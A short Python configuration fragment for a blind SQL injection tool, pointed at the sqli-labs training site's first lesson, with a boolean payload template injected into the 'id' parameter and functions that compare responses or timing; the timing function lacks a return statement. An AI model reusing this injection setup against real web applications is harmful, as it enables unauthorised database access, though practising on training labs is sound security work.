url = "http://sqlilabs.cc/Less-1/"
method = 'get'
injerp = 'id'
param = {'id':''}
payload = "1' and {}"
dbnmax = 100
type = 'boolen1'
time = 2 # 盲注

def right(freq,req):
    fhtml = freq.text
    html = req.text
    return fhtml != html
def tright(freq,req):
    req.elapsed.total_seconds() > 5
rightf = right